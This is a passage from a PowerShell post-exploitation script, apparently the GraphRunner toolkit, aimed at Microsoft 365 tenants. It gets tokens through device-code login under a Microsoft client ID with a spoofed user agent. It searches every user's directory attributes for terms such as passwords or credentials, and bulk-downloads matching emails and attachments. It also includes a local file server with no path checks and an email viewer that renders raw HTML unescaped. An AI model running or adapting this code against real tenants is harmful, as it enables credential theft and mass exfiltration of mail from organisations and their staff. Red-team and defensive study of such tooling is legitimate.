    $value = $parameter.Value
    Write-Host "$name : $value"
}
Write-Host -ForegroundColor Yellow ("=" * 80) 
}



function Invoke-UserAttributeSearch{
Param(

    [Parameter(Position = 0, Mandatory = $False)]
    [object[]]
    $Tokens = "",

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $SearchTerm = ""
  )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        $accesstoken = $tokens.access_token
        $refreshtoken = $tokens.refresh_token
    }
    else{

        Write-Host -ForegroundColor yellow "[*] Initiating a device code login"

        $body = @{
            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "resource" =      "https://graph.microsoft.com"
        }
        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        $authResponse = Invoke-RestMethod `
            -UseBasicParsing `
            -Method Post `
            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
            -Headers $Headers `
            -Body $body
        Write-Host -ForegroundColor yellow $authResponse.Message

        $continue = "authorization_pending"
        while($continue)
                {
    
            $body=@{
                "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
                "code" =       $authResponse.device_code
            }
            try{
            $tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
            }
            catch{
            $details=$_.ErrorDetails.Message | ConvertFrom-Json
            $continue = $details.error -eq "authorization_pending"
            Write-Output $details.error
            }
            if($tokens)
                {
                    write-host -ForegroundColor Yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
                    $accesstoken = $tokens.access_token
                    $refreshToken = $tokens.refresh_token
                    break
                }
            Start-Sleep -Seconds 3
        }
    }    

    $headers = @{
        Authorization = "Bearer $accessToken"
    }

    $usersEndpoint = "https://graph.microsoft.com/v1.0/users"
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    Write-Host "[*] Now searching each user attribute for the term $searchTerm"
    # Query users
    Write-Host "[*] Gathering the users from the tenant."
    do{
        
        $usersResponse = Invoke-RestMethod -Uri $usersEndpoint -Headers $headers

        $attributes = '?$select=accountEnabled,ageGroup,assignedLicenses,businessPhones,city,companyName,consentProvidedForMinor,country,createdDateTime,creationType,department,displayName,mail,employeeId,employeeHireDate,employeeOrgData,employeeType,onPremisesExtensionAttributes,externalUserStateChangeDateTime,faxNumber,givenName,imAddresses,identities,externalUserState,jobTitle,surname,lastPasswordChangeDateTime,legalAgeGroupClassification,mailNickname,mobilePhone,id,officeLocation,onPremisesSamAccountName,onPremisesDistinguishedName,onPremisesDomainName,onPremisesImmutableId,onPremisesLastSyncDateTime,onPremisesProvisioningErrors,onPremisesSecurityIdentifier,onPremisesSyncEnabled,onPremisesUserPrincipalName,otherMails,passwordPolicies,passwordProfile,preferredDataLocation,preferredLanguage,proxyAddresses,Comment,Info,Password,Information,Description,login,signin,credential,cred,credentials,data,signInSessionsValidFromDateTime,sponsors,state,streetAddress,usageLocation,userPrincipalName,userType,postalCode&$expand=manager'

        
        foreach ($user in $usersResponse.value) {
            $userId = $user.id
            $uri = ($graphApiUrl + "/users/" + $userId + $attributes)
            $userAttributesResponse = Invoke-RestMethod -Uri $uri -Headers $headers
            $upn = $userAttributesResponse.UserPrincipalName
            # Search through attributes (excluding @odata.context)
            $propertiesToSearch = $userAttributesResponse.PSObject.Properties | Where-Object { $_.Name -ne "@odata.context" }
            foreach ($property in $propertiesToSearch) {
                $propertyName = $property.Name
                $propertyValue = $property.Value

                if ($propertyValue -is [string] -and $propertyValue -like "*$searchTerm*") {
                    Write-Host -ForegroundColor green "[*] Found a match! User: $upn in attritube: $propertyName : $propertyValue"
                }

            }
     
        }
        if ($usersResponse.'@odata.nextLink') {
            Write-Host "[*] Gathering more users..."
            $usersEndpoint = $usersResponse.'@odata.nextLink'
        }
        else {
            # No more pages, exit loop
            break
        }
    } while ($true)

}

Function Invoke-SearchMailbox{
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $searchTerm = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [string]
    $messageCount = "25"
    )


    $access_token = $Tokens.access_token

    $graphApiUrl = "https://graph.microsoft.com/v1.0/search/query"

    # Define the headers with the access token and content type
    $headers = @{
    "Authorization" = "Bearer $access_token"
    "Content-Type" = "application/json"
    }

    # Define the search query
    $searchQuery = @{ requests = @( @{
        entityTypes = @("message")
        query = @{
            queryString = $searchTerm
        }
        from = 1
        size = $MessageCount
        }
    )
    }

    # Convert the search query to JSON format
    $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10

    # Perform the HTTP POST request to search emails
    $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson

    # Process the response and display the summary
    $total = $response.value[0].hitsContainers[0].total
    Write-Host -ForegroundColor yellow "[*] Found $total matches for search term $searchTerm"
    foreach ($hit in $response.value[0].hitsContainers[0].hits) {
    $subject = $hit.resource.subject
    $sender = $hit.resource.sender.emailAddress.address
    $receivers = $hit.resource.replyTo | ForEach-Object { $_.emailAddress.Name }
    $date = $hit.resource.sentDateTime
    $preview = $hit.resource.bodyPreview

    Write-Output "Subject: $subject | Sender: $sender | Receivers: $($receivers -join ', ') | Date: $date | Message Preview: $preview"
    Write-Host ("=" * 80) 
    }

    while($download -notlike "Yes"){
        Write-Host -ForegroundColor Cyan "[*] Do you want to download these emails and their attachments? (Yes/No)"
        $answer = Read-Host 
        $answer = $answer.ToLower()
        if ($answer -eq "yes" -or $answer -eq "y") {
            Write-Host -ForegroundColor yellow "[*] Downloading messages..."
            $download = "Yes"
        } elseif ($answer -eq "no" -or $answer -eq "n") {
            Write-Output "[*] Quitting..."
            break
        } else {
            Write-Output "Invalid input. Please enter Yes or No."
        }
    }

    if ($download -like "Yes"){
        $emailFileNames = @()
        $folderName = "$searchTerm-" + (Get-Date -Format 'yyyyMMddHHmmss')
        New-Item -Path $folderName -ItemType Directory
        # Process the response and export email content
        foreach ($hit in $response.value[0].hitsContainers[0].hits) {
        $webLink = $hit.resource.webLink
        $itemId = [regex]::Match($webLink, "ItemID=([^&]+)").Groups[1].Value
        $subject = $hit.resource.subject

        # Remove special characters and replace spaces with underscores
        $cleanedSubject = $subject -replace '[^\w\s]', '' -replace '\s', '_'
        $dateTimeString = $messageDetails.sentDateTime
        $dateTime = [DateTime]::ParseExact($dateTimeString, "yyyy-MM-ddTHH:mm:ssZ", [System.Globalization.CultureInfo]::InvariantCulture)
        $numericDate = $dateTime.ToString("yyyyMMddHHmmss")
        $filename = ($cleanedSubject + "-" + $numericDate +".json")
        $emailFileNames += $filename

        # Fetch email details using the message ID
        Write-Host "[*] Downloading $cleanedSubject"
        $messageDetails = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages/$itemId" -Headers $headers -Method Get

        # Save email details as a .msg file
        $messageDetails | ConvertTo-Json | Out-File -FilePath "$folderName\$filename" -Encoding UTF8

        # Fetch and save attachments
        if ($messageDetails.hasAttachments -like "True") {
                Write-Host ("[**] " + $messageDetails.subject + " has attachments.")
                $attachmentDetails = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages/$itemId/attachments" -Headers $headers -Method Get

                foreach($item in $attachmentDetails.value){
                $attachmentContentBytes = [System.Convert]::FromBase64String($item.contentBytes)
                $attachmentFileName = ($CleanedSubject + "-attached-" + $item.name)
                Write-Host "[***] Downloading attachment $attachmentFileName"
                $attachmentContentBytes | Set-Content -Path "$folderName\$attachmentFileName" -Encoding Byte
                }
        
        }
        }
        # Export the email file names to filelist.json
        $emailFileNames | ConvertTo-Json | Out-File -FilePath "$folderName\filelist.json" -Encoding UTF8
        $htmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f7f7f7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .app-container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            max-width: 1200px;
        }
        .email-summary {
            cursor: pointer;
            margin: 10px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            transition: background-color 0.2s;
        }
        .email-summary:hover {
            background-color: #f7f7f7;
        }
        .email-summary strong {
            color: #333;
        }
        .email-content {
            max-height: 500px; /* Set the maximum height for the scrollable container */
            overflow: auto; /* Enable scrolling if content exceeds the maximum height */
            border: 1px solid #ccc;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <h1>GraphRunner Email Viewer</h1>
        <div id="emailList"></div>
        <div id="emailContainer" class="email-content"></div>
    </div>

    <script>
        const emailList = document.getElementById('emailList');
        const emailContainer = document.getElementById('emailContainer');

        fetchEmailList();

        async function fetchEmailList() {
            try {
                const response = await fetch('filelist.json');
                const fileListContent = await response.text();
                const fileList = JSON.parse(fileListContent);

                fileList.forEach(async (file) => {
                    const response = await fetch(file);
                    const email = await response.json();

                    const emailSummaryDiv = document.createElement('div');
                    emailSummaryDiv.classList.add('email-summary');
                    emailSummaryDiv.innerHTML = ``
                        <strong>Subject:</strong> `${email.subject}<br>
                        <strong>Sender:</strong> `${email.sender.emailAddress.name}<br>
                        <strong>From:</strong> `${email.from.emailAddress.name} (`${email.from.emailAddress.address})<br>
                        <strong>Preview:</strong> `${email.bodyPreview}<br>
                        <strong>Attachments:</strong> `${email.hasAttachments ? 'Yes' : 'No'}<br>
                    ``;
                    
                    emailSummaryDiv.addEventListener('click', () => loadFullEmail(email));
                    emailList.appendChild(emailSummaryDiv);
                });
            } catch (error) {
                console.error('Error fetching file list:', error);
            }
        }

        function loadFullEmail(email) {
            emailContainer.innerHTML = email.body.content;
        }
    </script>
</body>
</html>
"@
        
        $htmlContent | Out-File -FilePath "$folderName\emailviewer.html" -Encoding UTF8
        Write-Host -ForegroundColor Green "[*] Emails and attachments have been exported to the $folderName directory."
        Write-Host -ForegroundColor yellow "[*] A simple emailviewer.html has been provided to view the exported emails."
        Write-Host -ForegroundColor yellow "[*] To use it run the Invoke-HTTPServer module in the $folderName directory and then navigate to http://localhost:8000/emailviewer.html"
    }
}



function Invoke-HTTPServer{
 param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $port = "8000"
)

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$port/")
$listener.Start()

Write-Host "Listening for requests on http://localhost:$port/"

while ($listener.IsListening) {
     $context = $listener.GetContext()
     $response = $context.Response

     $filename = $context.Request.Url.LocalPath.TrimStart('/')
     $content = Get-Content -Path $filename -Raw

     $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
     $response.ContentLength64 = $buffer.Length
     $response.OutputStream.Write($buffer, 0, $buffer.Length)
     $response.OutputStream.Close()
}

}
